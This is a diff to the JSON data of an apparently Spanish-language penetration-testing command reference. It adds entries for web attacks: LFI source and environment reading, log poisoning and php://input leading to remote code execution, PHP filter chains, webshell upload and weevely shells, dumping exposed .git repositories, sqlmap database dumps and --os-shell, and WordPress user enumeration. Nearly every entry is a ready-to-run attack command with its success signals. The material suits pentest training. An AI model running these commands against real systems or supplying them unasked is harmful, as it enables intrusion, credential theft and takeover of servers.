@@ -7,7 +7,7 @@
     "totalGuides": 10,
     "totalConcepts": 74,
     "totalPaths": 14,
-    "totalCommandMetadata": 169
+    "totalCommandMetadata": 187
   },
   "tags": [
     "active-directory",
@@ -11903,6 +11903,433 @@
         "Recordar 'exit' para cerrar el log"
       ],
       "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-ficheros-y-ejecucion",
+      "command": "curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=index.php\"",
+      "objective": "Leer el codigo fuente via LFI (php filter)",
+      "tool": "curl",
+      "environment": "attacker",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [
+        "Un parametro que incluye ficheros (LFI)"
+      ],
+      "expectedOutput": "El PHP en base64 (decodifica para leerlo).",
+      "successSignal": "Ves el fuente de index.php: busca credenciales/rutas.",
+      "commonErrors": [
+        "El parametro sanea la entrada",
+        "No es include, es readfile"
+      ],
+      "alternative": "../../ path traversal",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-ficheros-y-ejecucion",
+      "command": "curl -sS \"$URL/page.php?file=/proc/self/environ\"",
+      "objective": "Leer variables de entorno del proceso (LFI)",
+      "tool": "curl",
+      "environment": "attacker",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [
+        "LFI y /proc legible"
+      ],
+      "expectedOutput": "Las env vars del proceso web.",
+      "successSignal": "Filtras secretos o preparas RCE inyectando en User-Agent.",
+      "commonErrors": [
+        "/proc restringido por config"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-ficheros-y-ejecucion",
+      "command": "curl -sS \"$URL/page.php?file=/var/log/apache2/access.log\"",
+      "objective": "Leer el log de Apache (paso previo a poisoning)",
+      "tool": "curl",
+      "environment": "attacker",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [
+        "LFI y ruta de log legible"
+      ],
+      "expectedOutput": "El contenido del access.log via LFI.",
+      "successSignal": "Confirmas que puedes incluir el log (luego lo envenenas).",
+      "commonErrors": [
+        "Ruta de log distinta",
+        "Sin permiso de lectura"
+      ],
+      "alternative": "/var/log/nginx/access.log",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-ficheros-y-ejecucion",
+      "command": "curl -sS \"$URL/\" -A 'PAYLOAD_PHP'; curl -sS \"$URL/page.php?file=/var/log/apache2/access.log&c=id\"",
+      "objective": "LFI a RCE por log poisoning",
+      "tool": "curl",
+      "environment": "attacker",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "intrusive",
+      "preconditions": [
+        "Poder incluir un log donde escribes (User-Agent)"
+      ],
+      "expectedOutput": "El PHP inyectado en el log se ejecuta al incluirlo.",
+      "successSignal": "El parametro c=id devuelve la salida del comando.",
+      "commonErrors": [
+        "El log rota o no es incluible",
+        "WAF filtra el UA"
+      ],
+      "alternative": "php://input / data://",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-ficheros-y-ejecucion",
+      "command": "curl -sS --data 'PAYLOAD_PHP' \"$URL/page.php?file=php://input&c=id\"",
+      "objective": "RCE via wrapper php://input",
+      "tool": "curl",
+      "environment": "attacker",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "intrusive",
+      "preconditions": [
+        "LFI con allow_url_include=On"
+      ],
+      "expectedOutput": "El PHP del cuerpo se ejecuta.",
+      "successSignal": "c=id devuelve la salida: RCE confirmada.",
+      "commonErrors": [
+        "allow_url_include Off (no funciona)"
+      ],
+      "alternative": "data:// wrapper",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-ficheros-y-ejecucion",
+      "command": "python3 php_filter_chain_generator.py --chain 'PAYLOAD_PHP'",
+      "objective": "Generar cadena de filtros PHP para RCE sin fichero",
+      "tool": "python",
+      "environment": "attacker",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "intrusive",
+      "preconditions": [
+        "LFI que pasa por php://filter"
+      ],
+      "expectedOutput": "Una URL enorme de filtros que inyecta tu PHP.",
+      "successSignal": "Ejecutas codigo sin poder subir ningun fichero.",
+      "commonErrors": [
+        "El payload muy largo se trunca"
+      ],
+      "alternative": "log poisoning",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-ficheros-y-ejecucion",
+      "command": "curl -sS -F 'file=@shell.phtml;type=image/png' \"$URL/upload\"",
+      "objective": "Subir una webshell saltando el filtro de tipo",
+      "tool": "curl",
+      "environment": "attacker",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "intrusive",
+      "preconditions": [
+        "Formulario de subida que valida por Content-Type"
+      ],
+      "expectedOutput": "El fichero se acepta como si fuera imagen.",
+      "successSignal": "La shell queda accesible en la carpeta de subidas.",
+      "commonErrors": [
+        "Valida extension real o contenido (magic bytes)",
+        "Carpeta sin ejecucion PHP"
+      ],
+      "alternative": "doble extension / .phtml/.php5",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-ficheros-y-ejecucion",
+      "command": "weevely generate S3cr3t shell.php",
+      "objective": "Crear una webshell ofuscada (weevely)",
+      "tool": "weevely",
+      "environment": "attacker",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "silent",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Un shell.php dificil de detectar por firmas.",
+      "successSignal": "Tienes la shell para subir al objetivo.",
+      "commonErrors": [
+        "El AV del server la detecta igual"
+      ],
+      "alternative": "p0wny-shell / b374k",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-ficheros-y-ejecucion",
+      "command": "weevely $URL/uploads/shell.php S3cr3t",
+      "objective": "Conectar a una webshell weevely",
+      "tool": "weevely",
+      "environment": "attacker",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "intrusive",
+      "preconditions": [
+        "La shell subida es accesible por URL"
+      ],
+      "expectedOutput": "Una consola tipo terminal sobre la webshell.",
+      "successSignal": "Ejecutas comandos y usas modulos de weevely.",
+      "commonErrors": [
+        "Ruta o contrasena incorrectas"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-ficheros-y-ejecucion",
+      "command": "curl -sS \"$URL/.git/HEAD\"",
+      "objective": "Detectar un repositorio .git expuesto",
+      "tool": "curl",
+      "environment": "attacker",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "La referencia HEAD si el .git es accesible.",
+      "successSignal": "Responde 'ref: refs/heads/...': hay fuente que dumpear.",
+      "commonErrors": [
+        "404: no hay .git expuesto"
+      ],
+      "alternative": "revisar /.svn /.hg",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-ficheros-y-ejecucion",
+      "command": "git-dumper $URL/.git/ ./loot_git",
+      "objective": "Descargar el codigo de un .git expuesto",
+      "tool": "git-dumper",
+      "environment": "attacker",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "safe",
+      "preconditions": [
+        "El /.git/ es navegable"
+      ],
+      "expectedOutput": "El repositorio reconstruido en local.",
+      "successSignal": "Lees el fuente y el historial (a veces con secretos).",
+      "commonErrors": [
+        "Directory listing desactivado (dump parcial)"
+      ],
+      "alternative": "git log -p para secretos",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "sqli",
+      "command": "sqlmap -r request.txt --batch",
+      "objective": "Probar SQLi automatico desde una peticion",
+      "tool": "sqlmap",
+      "environment": "attacker",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "high",
+      "risk": "intrusive",
+      "preconditions": [
+        "Guardar la peticion (Burp) en request.txt"
+      ],
+      "expectedOutput": "sqlmap dice si algun parametro es inyectable.",
+      "successSignal": "Marca un parametro como vulnerable y el tipo de SQLi.",
+      "commonErrors": [
+        "Ningun parametro inyectable",
+        "WAF bloquea (usa --tamper)"
+      ],
+      "alternative": "inyeccion manual UNION",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "sqli",
+      "command": "sqlmap -r request.txt --dbs",
+      "objective": "Enumerar las bases de datos",
+      "tool": "sqlmap",
+      "environment": "attacker",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "high",
+      "risk": "intrusive",
+      "preconditions": [
+        "Una inyeccion ya confirmada"
+      ],
+      "expectedOutput": "El listado de bases de datos.",
+      "successSignal": "Ves los nombres de BBDD para elegir cual dumpear.",
+      "commonErrors": [
+        "El usuario de BD no ve otras bases"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "sqli",
+      "command": "sqlmap -r request.txt -D db -T users --dump",
+      "objective": "Volcar una tabla concreta",
+      "tool": "sqlmap",
+      "environment": "attacker",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "high",
+      "risk": "intrusive",
+      "preconditions": [
+        "Saber base y tabla objetivo"
+      ],
+      "expectedOutput": "El contenido de la tabla (a menudo credenciales).",
+      "successSignal": "Salen usuarios y hashes para crackear.",
+      "commonErrors": [
+        "Tabla o columna mal escritas"
+      ],
+      "alternative": "--dump-all (mas ruidoso)",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "sqli",
+      "command": "sqlmap -u \"$URL/page.php?id=1\" --risk 2 --level 3 --batch",
+      "objective": "SQLi automatico desde una URL con GET",
+      "tool": "sqlmap",
+      "environment": "attacker",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "high",
+      "risk": "intrusive",
+      "preconditions": [],
+      "expectedOutput": "sqlmap prueba mas vectores al subir risk/level.",
+      "successSignal": "Encuentra una inyeccion que el nivel por defecto no vio.",
+      "commonErrors": [
+        "Subir risk/level lo hace mucho mas lento"
+      ],
+      "alternative": "-r request.txt si hay POST/headers",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "sqli",
+      "command": "sqlmap -r request.txt --os-shell",
+      "objective": "Intentar RCE a traves de la SQLi",
+      "tool": "sqlmap",
+      "environment": "attacker",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "high",
+      "risk": "intrusive",
+      "preconditions": [
+        "SQLi con permisos altos (FILE/stacked)"
+      ],
+      "expectedOutput": "Una shell del SO si la BD permite escribir/ejecutar.",
+      "successSignal": "Consigues ejecutar comandos en el servidor.",
+      "commonErrors": [
+        "Sin privilegios FILE o secure_file_priv restringido"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "wordpress",
+      "command": "wpscan --url $URL --enumerate p,t,u",
+      "objective": "Enumerar plugins, temas y usuarios de WP",
+      "tool": "wpscan",
+      "environment": "attacker",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "caution",
+      "preconditions": [],
+      "expectedOutput": "Plugins/temas con version y usuarios validos.",
+      "successSignal": "Un plugin con CVE conocido o un usuario para brute.",
+      "commonErrors": [
+        "Sin API token: menos info de vulnerabilidades"
+      ],
+      "alternative": "wpscan --api-token",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "wordpress",
+      "command": "curl -sS \"$URL/wp-json/wp/v2/users?per_page=100\" | head",
+      "objective": "Enumerar usuarios via REST API",
+      "tool": "curl",
+      "environment": "attacker",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "JSON con los usuarios (slug/name) si la REST esta abierta.",
+      "successSignal": "Sacas nombres de usuario sin wpscan.",
+      "commonErrors": [
+        "REST users deshabilitada (403/vacio)"
+      ],
+      "alternative": "wpscan --enumerate u",
       "checkedVersion": "2025.1",
       "reviewedAt": "2026-07-11"
     }
